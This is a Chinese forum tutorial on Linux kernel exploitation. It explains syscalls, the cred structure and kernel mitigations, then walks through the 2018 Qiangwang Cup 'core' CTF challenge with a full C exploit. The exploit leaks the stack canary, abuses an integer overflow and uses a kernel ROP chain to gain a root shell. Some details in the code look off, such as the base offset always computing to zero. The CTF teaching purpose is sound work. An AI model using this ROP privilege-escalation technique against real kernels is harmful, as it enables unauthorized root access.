> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.52pojie.cn](https://www.52pojie.cn/thread-1713663-1-1.html)

> [md]# 0x00 基础知识 ## 1. linux kernel pwn`kernel` 也是一个程序，用来管理软件发出的数据 `I/O` 要求，将这些要求转义为指令，交给 `CPU` 和计算机中的其......

![](https://avatar.52pojie.cn/data/avatar/001/92/50/45_avatar_middle.jpg)peiwithhao _ 本帖最后由 peiwithhao 于 2022-11-16 10:49 编辑_  

0x00 基础知识
=========

1. linux kernel pwn
-------------------

`kernel` 也是一个程序，用来管理软件发出的数据 `I/O` 要求，将这些要求转义为指令，交给 `CPU` 和计算机中的其他组件处理，`kernel` 是现代操作系统最基本的部分。  
![](https://ctf-wiki.org/pwn/linux/kernel-mode/figure/Kernel_Layout.svg)  
以上便是`ctf wiki`原话 ，所以大家也不要太过于认为其很难，其实跟咱们用户态就是不同而已，也可能就涉及那么些底层知识罢了（师傅轻喷，我就口嗨一下）。  
在学习攻击手段之前可以先看看我前面环境准备和简单驱动编写那两篇，可能对您有更大帮助。

> Linux kernel 环境搭建—0x00  
> [https://www.52pojie.cn/thread-1706316-1-1.html](https://www.52pojie.cn/thread-1706316-1-1.html)  
> (出处: 吾爱破解论坛)  
> Linux kernel 环境搭建—0x01  
> [https://www.52pojie.cn/thread-1710242-1-1.html](https://www.52pojie.cn/thread-1710242-1-1.html)  
> (出处: 吾爱破解论坛)

而`kernel` 最主要的功能有两点：

*   控制并与硬件进行交互
*   提供 `application` 能运行的环境  
    包括`I/O`，权限控制，系统调用，进程管理，内存管理等多项功能都可以归结到上边两点中。

需要注意的是，`kernel` 的`crash` 通常会引起重启。（所以咱们这点调试的时候就挺不方便的了，相比于用户态而言），不过这里也可能我刚开始学比较笨而已。

2. Ring Model(等级制度森严!(狗头)）
--------------------------

1.  intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0, Ring 1, Ring 2, Ring 3。
2.  Ring0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。
3.  使用 Ring Model 是为了提升系统安全性，例如某个间谍软件作为一个在 Ring 3 运行的用户程序，在不通知用户的时候打开摄像头会被阻止，因为访问硬件需要使用 being 驱动程序保留的 Ring 1 的方法。

注意大多数的现代操作系统只使用了 Ring 0 和 Ring 3。

3. syscall
----------

也就是系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如`scanf`，`puts` 等 `IO` 相关的函数实际上是对系统调用的封装（`read` 和 `write`））。

4. 状态转换（大的要来力！）
---------------

`user space to kernel space`  
当发生 系统调用，产生异常，外设产生中断等事件时，会发生用户态到内核态的切换，具体的过程为：

1.  通过`swapgs`切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用。
    
2.  将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。（这里我在调试的时候发现没整 rbp，我最开始就发现这里怎么只保存了 rsp，这个问题暂时还不是很了解）
    
3.  通过 push 保存各寄存器值，具体的代码如下:
    
    ```
    ENTRY(entry_SYSCALL_64)
    /* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */
    SWAPGS_UNSAFE_STACK
    /* 保存栈值，并设置内核栈 */
    movq %rsp, PER_CPU_VAR(rsp_scratch)
    movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp
    /* 通过push保存寄存器值，形成一个pt_regs结构 */
    /* Construct struct pt_regs on stack */
    pushq  $ __USER_DS      /* pt_regs->ss */
    pushq  PER_CPU_VAR(rsp_scratch)  /* pt_regs->sp */
    pushq  %r11             /* pt_regs->flags */
    pushq  $__USER_CS      /* pt_regs->cs */
    pushq  %rcx             /* pt_regs->ip */
    pushq  %rax             /* pt_regs->orig_ax */
    pushq  %rdi             /* pt_regs->di */
    pushq  %rsi             /* pt_regs->si */
    pushq  %rdx             /* pt_regs->dx */
    pushq  %rcx tuichu    /* pt_regs->cx */
    pushq  $-ENOSYS        /* pt_regs->ax */
    pushq  %r8              /* pt_regs->r8 */
    pushq  %r9              /* pt_regs->r9 */
    pushq  %r10             /* pt_regs->r10 */
    pushq  %r11             /* pt_regs->r11 */
    sub $(6*8), %rsp      /* pt_regs->bp, bx, r12-15 not saved */
    
    ```
    
4.  通过汇编指令判断是否为 x32_abi。
    
5.  通过系统调用号，跳到全局变量 sys_call_table 相应位置继续执行系统调用。  
    这里再给出保存栈的结构示意图，这里我就引用下别的师傅的图了。注意这是保存在内核栈中  
    ![](https://img-blog.csdnimg.cn/20201105102427468.png?)
    

5. kernel space to user space
-----------------------------

退出时，流程如下：

1.  通过 swapgs 恢复 GS 值
2.  通过 sysretq 或者 iretq 恢复到用户控件继续执行。如果使用 iretq 还需要给出用户空间的一些信息（CS, eflags/rflags, esp/rsp 等）

6. struct cred
--------------

咱们要管理进程的权限，那么内核必定会维护一些数据结构来保存，他是用 cred 结构体记录的，每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。  
下面就是 cred 的数据结构源码

```
struct cred {
    atomic_t    usage;
#ifdef CONFIG_DEBUG_CREDENTIALS
    atomic_t    subscribers;    /* number of processes subscribed */
    void        *put_addr;
    unsigned    magic;
#define CRED_MAGIC  0x43736564
#define CRED_MAGIC_DEAD 0x44656144
#endif
    kuid_t      uid;        /* real UID of the task */
    kgid_t      gid;        /* real GID of the task */
    kuid_t      suid;       /* saved UID of the task */
    kgid_t      sgid;       /* saved GID of the task */
    kuid_t      euid;       /* effective UID of the task */
    kgid_t      egid;       /* effective GID of the task */
    kuid_t      fsuid;      /* UID for VFS ops */
    kgid_t      fsgid;      /* GID for VFS ops */
    unsigned    securebits; /* SUID-less security management */
    kernel_cap_t    cap_inheritable; /* caps our children can inherit */
    kernel_cap_t    cap_permitted;  /* caps we're permitted */
    kernel_cap_t    cap_effective;  /* caps we can actually use */
    kernel_cap_t    cap_bset;   /* capability bounding set */
    kernel_cap_t    cap_ambient;    /* Ambient capability set */
#ifdef CONFIG_KEYS
    unsigned char   jit_keyring;    /* default keyring to attach requested
                     * keys to */
    struct key __rcu *session_keyring; /* keyring inherited over fork */
    struct key  *process_keyring; /* keyring private to this process */
    struct key  *thread_keyring; /* keyring private to this thread */
    struct key  *request_key_auth; /* assumed request_key authority */
#endif
#ifdef CONFIG_SECURITY
    void        *security;  /* subjective LSM security */
#endif
    struct user_struct *user;   /* real user ID subscription */
    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
    struct group_info *group_info;  /* supplementary groups for euid/fsgid */
    struct rcu_head rcu;        /* RCU deletion hook */
} __randomize_layout;

```

基础知识介绍完毕，咱们开始介绍咱们内核 pwn 的最主要的目的

0x01 目的
=======

借用 arttnba3 师傅的原话：“毫无疑问，对于内核漏洞进行利用，并最终提权到 root，在黑客界是一种最为 old school 的美学（（“我这里打两个括号以示尊敬（。  
咱们在内核 pwn 中，最重要以及最广泛的那就是提权了，其他诸如 dos 攻击等也行，但是主要是把人家服务器搞崩之类的，并没有提权来的高效。

1. 提权 (Elevation of authority)
------------------------------

所谓提权，直译也即提升权限，是在咱们已经在得到一个 shell 之后，咱们进行深入攻击的操作，那么请问如何得到一个 shell 呢，那就请大伙好好学习用户模式下的 pwn 吧（  
而与提权息息相关的那不外乎两个函数，不过咱们先不揭晓他们，咱们先介绍一个结构体：  
在内核中使用结构体 `task_struct` 表示一个进程，该结构体定义于内核源码`include/linux/sched.h`中，代码比较长就不在这里贴出了  
一个进程描述符的结构应当如下图所示：  
![](https://i.loli.net/2021/02/23/2W8xIfwqm9Y7Fru.png)  
注意到 task_struct 的源码中有如下代码：

```
/* Process credentials: */

/* Tracer's credentials at attach: */
const struct cred __rcu        *ptracer_cred;

/* Objective and real subjective task credentials (COW): */
const struct cred __rcu        *real_cred;

/* Effective (overridable) subjective task credentials (COW): */
const struct cred __rcu        *cred;

```

看到熟悉的字眼没，对，那就是 cred 结构体指针  
前面我们讲到，一个进程的权限是由位于内核空间的 cred 结构体进行管理的，那么我们不难想到：只要改变一个进程的 cred 结构体，就能改变其执行权限  
在内核空间有如下两个函数，都位于 kernel/cred.c 中：

*   `struct cred* prepare_kernel_cred(struct task_struct* daemon)`：该函数用以拷贝一个进程的 cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon 参数应为有效的进程描述符地址或 NULL, 如果传入 NULL, 则会返回一个 root 权限的 cred
*   `int commit_creds(struct cred *new)`：该函数用以将一个新的 cred 结构体应用到进程.  
    所以我们最重要的目的是类似于用户态下调用 system("/bin/sh") 一样, 咱们内核态就需要调用 commit_creds(prepare_kernel_cred(NULL)) 即可达成提权功能!  
    这里我们也可以看到 prepare_kernel_cred() 函数源码：

```
struct cred *prepare_kernel_cred(struct task_struct *daemon)
{
    const struct cred *old;
    struct cred *new;

    new = kmem_cache_alloc(cred_jar, GFP_KERNEL);
    if (!new)
        return NULL;

    kdebug("prepare_kernel_cred() alloc %p", new);

    if (daemon)
        old = get_task_cred(daemon);
    else
        old = get_cred(&init_cred);


```

0x02 保护措施
=========

1. KASLR
--------

与用户态 ASLR 类似，在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。

2. FGKASLR
----------

KASLR 虽然在一定程度上能够缓解攻击，但是若是攻击者通过一些信息泄露漏洞获取到内核中的某个地址，仍能够直接得知内核加载地址偏移从而得知整个内核地址布局，因此有研究者基于 KASLR 实现了 FGKASLR，以函数粒度重新排布内核代码

3. STACK PROTECTOR
------------------

类似于用户态程序的 canary，通常又被称作是 stack cookie，用以检测是否发生内核堆栈溢出，若是发生内核堆栈溢出则会产生 kernel panic  
内核中的 canary 的值通常取自 gs 段寄存器某个固定偏移处的值

4. SMAP/SMEP
------------

SMAP 即管理模式访问保护（Supervisor Mode Access Prevention），SMEP 即管理模式执行保护（Supervisor Mode Execution Prevention），这两种保护通常是同时开启的，用以阻止内核空间直接访问 / 执行用户空间的数据，完全地将内核空间与用户空间相分隔开，用以防范 ret2usr（return-to-user，将内核空间的指令指针重定向至用户空间上构造好的提权代码）攻击  
SMEP 保护的绕过有以下两种方式：

*   利用内核线性映射区对物理地址空间的完整映射，找到用户空间对应页框的内核空间地址，利用该内核地址完成对用户空间的访问（即一个内核空间地址与一个用户空间地址映射到了同一个页框上），这种攻击手法称为 ret2dir
*   Intel 下系统根据 CR4 控制寄存器的第 20 位标识是否开启 SMEP 保护（1 为开启，0 为关闭），若是能够通过 kernel ROP 改变 CR4 寄存器的值便能够关闭 SMEP 保护，完成 SMEP-bypass，接下来就能够重新进行 ret2usr，但对于开启了 KPTI 的内核而言，内核页表的用户地址空间无执行权限，这使得 ret2usr 彻底成为过去式

0x03 环境利用
=========

首先咱们拿到个 ctf 题目之后，咱们一般是先解包，会发现有这些个文件

1.  baby.ko  
    baby.ko 是包含漏洞的程序，一般使用 ida 打开分析, 可以根据 init 文件的路径去 rootfs.cpio 里面找
2.  bzImage  
    bzImage 是打包的内核代码，一般通过它抽取出 vmlinx, 寻找 gadget 也是在这里。
3.  initramfs.cpio  
    initramfs.cpio 是内核采用的文件系统
4.  startvm.sh  
    startvm.sh 是启动 QEMU 的脚本
5.  vmlinux  
    静态编译，未压缩的内核文件，可以在里面找 ROP
6.  init 文件  
    在 rootfs.cpio 文件解压可以看到，记录了系统初始化时的操作，一般在文件里 insmod 一个内核模块. ko 文件，通常是有漏洞的文件
7.  .ko 文件：需要拖到 IDA 里面分析找漏洞的文件，也即一般的漏洞出现的文件
    
    ```
    ---
    之后咱们可以利用rootfs.cpio解压的文件中看到init脚本，此即为加载文件系统的脚本，在一般为boot.sh或start.sh脚本中也记录了qemu的启动参数
    
    ```
    

1. 如何将 exp 送入本地调试
-----------------

我的办法比较笨，那就是本地编译然后放到文件系统里面在压缩为 cpio，这样再启动虚拟机的时候就会重新加载这个文件系统了

0x04 题目实战
=========

一道十分基础的内核 pwn 入门题

例题：强网杯 2018 - core
------------------

0. 反编译代码分析
----------

文件里面包含了这几个文件  
`bzImage`,`core.cpio`,`start.sh`,`vmlinux`  
先看看 start.sh

```
qemu-system-x86_64 \
-m 128M \
-kernel ./bzImage \
-initrd  ./core.cpio \
-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr" \
-s \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \

```

可以看到咱们这儿题目采用了 kaslr ，有地址随机，所以咱们需要泄露地址，大致思路和用户态一致。这里还注意那就是从 ctfwiki 上面下载下来的题目是 - m 64M, 这里会出现运行不了虚拟机的情况，所以咱们改为 128M 即可，这是内存大小的定义，太小了跑不动。

之后咱们再看看文件系统解压后得到的 init 脚本

```
#!/bin/sh
mount -t proc proc /proc
mount -t sysfs sysfs /sys
mount -t devtmpfs none /dev
/sbin/mdev -s
mkdir -p /dev/pts
mv exp.c /
mount -vt devpts -o gid=4,mode=620 none /dev/pts
chmod 666 /dev/ptmx
cat /proc/kallsyms > /tmp/kallsyms
echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict
ifconfig eth0 up
udhcpc -i eth0
ifconfig eth0 10.0.2.15 netmask 255.255.255.0
route add default gw 10.0.2.2 
insmod /core.ko
#setsid /bin/cttyhack setuidgid 0 /bin/sh

poweroff -d 120 -f &
setsid /bin/cttyhack setuidgid 1000 /bin/sh
echo 'sh end!\n'
umount /proc
umount /sys

poweroff -d 0  -f


```

从中我们可以看到文件系统中 insmod 了一个 core.ko，一般来讲这就是漏洞函数了，还有咱们可以添加`setsid /bin/cttyhack setuidgid 0 /bin/sh`这一句来使得我们进入虚拟机的时候就是 root 权限，大伙不必惊慌，这里是因为咱们是再本地需要进行调试，所以 init 脚本任我们改，start 脚本也是，咱们可以直接把 kalsr 关了也行，但关了并不代表咱们不管，咱们这一举动主要是为了方便调试的，最终打远程还是人家说了算，咱们值有一个 exp 能提交。  
接着分析 init，这里还发现开始时内核符号表被复制了一份到`/tmp/kalsyms`中，利用这个我们可以获得内核中所有函数的地址，还有个恶心的地方那就是这里开启了定时关机，咱们可以把这给先注释掉`poweroff -d 120 -f &`

进入漏洞模块的分析  
![](http://imgsrc.baidu.com/super/pic/item/42166d224f4a20a438bb7e05d5529822730ed04f.jpg)

这里可以看到有 canary 和 NX，所以咱们通过 ROP 的话需要进行 canary 泄露。  
接下来咱们分析相关函数 init_moddule  
![](http://imgsrc.baidu.com/super/pic/item/a9d3fd1f4134970ac9d052edd0cad1c8a6865d55.jpg)

可以看到模块加载的初期会创建一个名为`core`的进程，在虚拟机中在 / proc 目录下  
在看看比较重要的 ioctl 函数  
![](http://imgsrc.baidu.com/super/pic/item/77c6a7efce1b9d162f5ed8a3b6deb48f8d546453.jpg)

可以看出有三个模式选择，分别点入相关函数看

![](http://imgsrc.baidu.com/super/pic/item/77094b36acaf2edd18640b2bc81001e93801935f.jpg)
----------------------------------------------------------------------------------------

这里的 read 函数就是向用户指定的地址从 off 偏移地址写入 64 个字节.  
而从 ioctl 中第二个 case 可以看到咱们居然可以设置 off，所以我们可以通过设置偏移来写入 canary 的值，而我们从 ida 中可以看到咱们的 canary 是位于这里

* * *

![](http://imgsrc.baidu.com/super/pic/item/a5c27d1ed21b0ef40362da9c98c451da80cb3e6d.jpg)

可以知道相差对于 v5 相差 0x40，所以咱们设置的 off 也是 0x40

我们还可以来看看 file_operations,(不秦楚的大伙可以看看我的上一篇环境搭建的文章)，可以看到他只实现了 write，ioctl，release 的系统调用：

![](http://imgsrc.baidu.com/super/pic/item/50da81cb39dbb6fd4da7a7e44c24ab18962b3777.jpg)

* * *

![](http://imgsrc.baidu.com/super/pic/item/6d81800a19d8bc3e40f74408c78ba61ea9d34571.jpg)

* * *

![](http://imgsrc.baidu.com/super/pic/item/7aec54e736d12f2e7ffceca20ac2d56284356873.jpg)

我们再来看看其他函数，先看 core_write  
![](http://imgsrc.baidu.com/super/pic/item/8694a4c27d1ed21b193c6c27e86eddc450da3f7e.jpg)  
这里可以知道他总共可以向 name 这个地址写入 0x800 个字节，心动  
我们再来看看 ioctl 中第三个选项的 core_copy_func  
![](http://imgsrc.baidu.com/super/pic/item/810a19d8bc3eb135c137f579e31ea8d3fc1f4404.jpg)  
发现他可以从 name 上面拷贝数据到达栈上，然后这个判断存在着整形溢出，这里如果咱传个负数就可以达成效果了。

1. Kernel ROP
-------------

既然咱们可以在栈上做手脚，那么我们就可以利用 ROP 的方式了，首先找几个 gadget，这里的 gadget 是需要在 vmlinux 中寻找，我的推荐是用

```
objdump -d ./vmlinux > ropgadget \
cat ropgadget | grep "pop rdi; ret"

```

这样的类型进行寻找

### 1. 寻找 gadget

如图：  
对于上面所说的比较关键的两个函数`commit_creds`以及`prepare_kernel_cred`, 我们在 vmlinux 中去寻找他所加载的的地址  
然后我们可以看看 ropgadget 文件  
![](http://imgsrc.baidu.com/super/pic/item/aec379310a55b319d78ccdb706a98226cefc17fe.jpg)  
从中咱们可以看到其中即我们所需要的 gadget(实际上就是 linux 内核镜像所使用的汇编代码)，此时我们再通过 linux 自带的 grep 进行搜索，个人认为还是比较好用的，用`ropgadget`或者是`ropper`来说都可以，看各位师傅的喜好来. 具体使用情况如下：  
![](http://imgsrc.baidu.com/super/pic/item/b8389b504fc2d562427a9f2fa21190ef77c66c86.jpg)  
以此手法获得两个主要函数的地址后，此刻若咱们在 exp 中获得这两个函数的实际地址，然后将两者相减即可得到 KASLR 的偏移地址。  
自此咱们继续搜索别的 gadget，我们此刻需要的 gadget 共有如下几个：

```
swapgs; popfq;  ret;
mov rdi, rax;  call rdx; 
pop rdx; ret;  
pop rdi; ret;   
pop rcx; ret; 
iretq

```

师傅们可以用上述方法自行寻找.

### 2. 自行构造返回状态

虽然咱们的**提权**是在内核态当中，但我们最终还是需要返回用户态来得到一个 root 权限的 shell，所以当我们进行栈溢出 rop 之后还需要利用 swapgs 等保存在内核栈上的寄存器值返回到应得的位置，但是如何保证返回的时候不出错呢，对，那就只能在调用内核态的时候将即将保存的正确的寄存器值先保存在咱们自己申请的值里面，这样就方便咱们在 rop 链结尾填入他们实现返回不报错。既然涉及到了保存值，那我们就需要内嵌汇编代码来实现此功能，代码如下，这也可以视为一个通用代码；

```
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}


```

大伙学到了内核 pwn，那汇编功底自然不必说，我就不解释这段代码功能了。

### 3. 攻击思路

现在开始咱们的攻击思路思考，在上面介绍各个函数的时候我也稍微讲了点。我们所做的事主要如下：

> 1.  利用 ioctl 中的选项 2. 修改 off 为 0x40
>     
> 2.  利用 core_read, 也就是 ioctl 中的选项 1, 可将局部变量 v5 的 off 偏移地址打印, 经过调试可发现这里即为 canary
>     
> 3.  当咱们打印了 canary, 现在即可进行栈溢出攻击了, 但是溢出哪个栈呢, 我们发现 ioctl 的第三个选项中调用的函数 `core_copy_func`, 会将 bss 段上的 name 输入在栈上, 输入的字节数取决于咱们传入的数字, 并且此时他又整型溢出漏洞, 好, 就决定冤大头是他了
>     
> 4.  core.ko 所实现的系统调用 write 可以发现其中可以将我们传入的值写到 bss 段中的 name 上面, 天助我也, 所以咱们就可以在上面适当的构造 rop 链进行栈溢出了
>     

大伙看到这里是不是觉得有点奇怪, 欸, 刚才不是说要泄露地址码, 这兄弟是不是讲错了, 就这? 大家不要慌, 我这正要讲解, 从上面的 init 脚本中我们可以看到这一句:

```
cat /proc/kallsyms > /tmp/kallsyms

```

其中 /proc/kallsyms 中包含了内核中所有用到的符号表, 而处于用户态的我们是不能访问的, 所以出题人贴心的将他输出到了 / tmp/kallsyms 中, 这就使得我们在用户态也依然可以访问了, 所以我们还得在 exp 中写一个文件遍历的功能, 当然这对于学过系统编程的同学并不在话下,(可是我上这课在划水....)  
这里贴出代码给大伙先看看

```
void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }

}

```

当知道 exp 思路之后, 其他的一切就简单起来, 只需要看懂他然后实现即可.

### 4. gbb 调试 qemu 中内核基本方法

#### 众所周知, 调试在 pwn 中是十分重要的, 特别是动调, 所以这里介绍下 gdb 调试内核的方法

由于咱们的内核是跑在 qemu 中, 所以我们 gdb 需要用到远程调试的方法, 但是如果直接连端口的话会出现没符号表不方便调试的, 所以我们需要自行导入内核模块, 也就是文件提供的`vmlinux`, 之后由于咱们还需要 core.ko 的符号表, 所以咱们也可以通过自行导入来获得可以, 通过 `add-symbol-file core.ko textaddr` 加载 , 而这里的`textaddr`即为`core.ko`的`.tex`t 段地址, 我们可以通过修改`init`中为`root`权限进行设置.  
这里. text 段的地址可以通过 `/sys/modules/core/section/.text` 来查看，  
这里强烈建议大伙先关 kaslr(通过在启动脚本修改, 就是将 kaslr 改为 nokaslr) 再进行调试, 效果图如下  
![](http://imgsrc.baidu.com/super/pic/item/5882b2b7d0a20cf48316b11d33094b36adaf996a.jpg)  
我们可以通过`-gdb tcp:port`或者 `-s`来开启调试端口，`start.sh` 中已经有了 -s，不必再自己设置。(对了如果 - s , 他的功能等同于 - gdb tcp:1234)  
在我们获得. text 基地址后记得用脚本来开 gdb, 不然每次都要输入这么些个东西太麻烦了, 脚本如下十分简单:

```
#!/bin/bash
gdb -q \
  -ex "" \
  -ex "file ./vmlinux" \
  -ex "add-symbol-file ./extract/core.ko 0xffffffffc0000000" \
  -ex "b core_copy_func" \
  -ex "target remote localhost:1234" \

```

其中打断点可以先打在 core_read, 这里打在 core_copy_func 是我调到尾声修改的. 这里还注意一个点, 就是当采用 pwndbg 的时侯需要 root 权限才可以进行调试不然会出现以下错误  
![](http://imgsrc.baidu.com/super/pic/item/77094b36acaf2edd1b05062bc81001e938019378.jpg)  
最开始气死我了, 人家 peda 都不要 root, 但是最开始不清楚为什么会错, 我还以为是版本问题, 但想到这是我最近刚配的一台机子又应该不是, 其实最开始看到 permission 就该想到的, 害.  
我们用 root 权限进行开调  
![](http://imgsrc.baidu.com/super/pic/item/0824ab18972bd40717299c3f3e899e510eb30901.jpg)  
可以看到十分的成功, 此刻我 continue, 还记得咱们下的断电码, b core_read, 如果咱们调用它后咱们就会在这里停下来, 此刻我们运行咱们的程序试试  
![](http://imgsrc.baidu.com/super/pic/item/b7003af33a87e950aaf6bcae55385343faf2b40b.jpg)  
这样咱们就可以愉快的进行调试啦, 至此 gdb 调试内核基本方法到此结束~~~

### 5. ROP 链解析

这里简单讲讲, 直接给图  
![](http://imgsrc.baidu.com/super/pic/item/7c1ed21b0ef41bd5b84aa63614da81cb38db3dd2.jpg)  
相信大家理解起来不费力.

### 6. exp

本次 exp 如下, 大伙看看

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/ioctl.h>

size_t commit_creds = NULL, prepare_kernel_cred = NULL;        // address of to key function
#define SWAPGS_POPFQ_RET 0xffffffff81a012da
#define MOV_RDI_RAX_CALL_RDX 0xffffffff8101aa6a
#define POP_RDX_RET 0xffffffff810a0f49
#define POP_RDI_RET 0xffffffff81000b2f  
#define POP_RCX_RET 0xffffffff81021e53
#define IRETQ 0xffffffff81050ac2 
size_t user_cs, user_ss,user_rflags,user_sp;

//int fd = 0;        // file pointer of process 'core'

/*void saveStatus();
void get_function_address();
#void core_read(int fd, char* buf);
void change_off(int fd, long long off);
void core_copy_func(int fd, long long nbytes);
void print_binary(char* buf, int length);
void shell();
*/
void saveStatus(){
  __asm__("mov user_cs, cs;"
          "mov user_ss, ss;"
          "mov user_sp, rsp;"
          "pushf;"
          "pop user_rflags;"
          );
  puts("\033[34m\033[1m Status has been saved . \033[0m");
}

void core_read(int fd, char *addr){
  printf("try read\n");
  ioctl(fd,0x6677889B,addr);
  printf("read done!");
}

void change_off(int fd, long long off){
  printf("try set off \n");
  ioctl(fd,0x6677889C,off);
}

void core_copy_func(int fd, long long nbytes){
  puts("try cp\n");
  ioctl(fd,0x6677889A,nbytes);
}

void get_function_address(){
        FILE* sym_table = fopen("/tmp/kallsyms", "r");        // including all address of kernel functions,just like the user model running address.
        if(sym_table == NULL){
                printf("\033[31m\033[1m[x] Error: Cannot open file \"/tmp/kallsyms\"\n\033[0m");
                exit(1);
        }
        size_t addr = 0;
        char type[0x10];
        char func_name[0x50];
        // when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.
        while(fscanf(sym_table, "%llx%s%s", &addr, type, func_name)){
                if(commit_creds && prepare_kernel_cred)                // two addresses of key functions are all found, return directly.
                        return;
                if(!strcmp(func_name, "commit_creds")){                // function "commit_creds" found
                        commit_creds = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"commit_creds\" found: \033[0m%#llx\n", commit_creds);
                }else if(!strcmp(func_name, "prepare_kernel_cred")){
                        prepare_kernel_cred = addr;
                        printf("\033[32m\033[1m[+] Note: Address of function \"prepare_kernel_cred\" found: \033[0m%#llx\n", prepare_kernel_cred);
                }
        }
}

void shell(){
        if(getuid()){
                printf("\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m");
                exit(1);
        }
        printf("\033[32m\033[1m[+] Getting the root......\033[0m\n");
        system("/bin/sh");
        exit(0);
}

int main(){
  saveStatus();
  int fd = open("/proc/core",2);              //get the process fd
  if(!fd){
                printf("\033[31m\033[1m[x] Error: Cannot open process \"core\"\n\033[0m");
                exit(1);
        }
  char buffer[0x100] = {0};
        get_function_address();                // get addresses of two key function
  ssize_t vmlinux = commit_creds - commit_creds;            //base address
  printf("vmlinux_base = %x",vmlinux);
  //get canary 
  size_t canary;
  change_off(fd,0x40);
  //getchar();

  core_read(fd,buffer);
  canary = ((size_t *)buffer)[0];
  printf("canary ==> %p\n",canary);
  //build the ROP
  size_t rop_chain[0x1000] ,i= 0;
  printf("construct the chain\n");
  for(i=0; i< 10 ;i++){
    rop_chain[i] = canary;
  }
  rop_chain[i++] = POP_RDI_RET + vmlinux ; 
  rop_chain[i++] = 0;
  rop_chain[i++] = prepare_kernel_cred ;          //prepare_kernel_cred(0)
  rop_chain[i++] = POP_RDX_RET + vmlinux;
  rop_chain[i++] = POP_RCX_RET + vmlinux;
  rop_chain[i++] = MOV_RDI_RAX_CALL_RDX + vmlinux;
  rop_chain[i++] = commit_creds ;
  rop_chain[i++] = SWAPGS_POPFQ_RET + vmlinux;
  rop_chain[i++] = 0;
  rop_chain[i++] = IRETQ + vmlinux;
  rop_chain[i++] = (size_t)shell;
  rop_chain[i++] = user_cs;
  rop_chain[i++] = user_rflags;
  rop_chain[i++] = user_sp;
  rop_chain[i++] = user_ss;
  write(fd,rop_chain,0x800);
  core_copy_func(fd,0xffffffffffff0100); 
}


```

### 7. 编译运行

这里哟个小知识, 那就是在被攻击的内核中一般不会给你库函数, 所以咱们需要用 gcc 中的 - static 参数进行静态链接, 然后就是为了支持内嵌汇编代码, 所以我们需要使用`-masm=intel`, 这里 intel 也可以换 amd, 看各位汇编语言用的啥来进行修改. 我这里用的把保存状态代码是 intel 支持的.

```
gcc test.c -o test -static -masm=intel -g

```

将此编译得到的二进制文件打包近文件系统然后重新启动, 情况如图  
![](http://imgsrc.baidu.com/super/pic/item/faf2b2119313b07e6cb81eca49d7912396dd8cef.jpg)

##### **成功提权!!!!!**

0x05 总结
=======

为了学这一个题目所需要的知识还是费了点功夫的, 需要对于驱动等环境的理解然后就是遇到困难之后静下心寻找问题的耐心, 还有最重要的一点就是细心, 就因为最后一个 sp 错写成 ss 导致一直打不通. ![](https://avatar.52pojie.cn/data/avatar/001/92/50/45_avatar_middle.jpg) 大伙这里 core 是 ctfwiki 上自带的题，题目包链接如下可自行下载进行学习  

> https://github.com/ctf-wiki/ctf-challenges ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 牛牛牛，不错的。值得分享 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) peiwithhao 不明觉厉！ ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 4455353453534534534534534534543 ![](https://avatar.52pojie.cn/images/noavatar_middle.gif) 不明觉厉！![](https://avatar.52pojie.cn/images/noavatar_middle.gif)cycy 西柚 感谢分享![](https://avatar.52pojie.cn/images/noavatar_middle.gif)八月未央 学习学习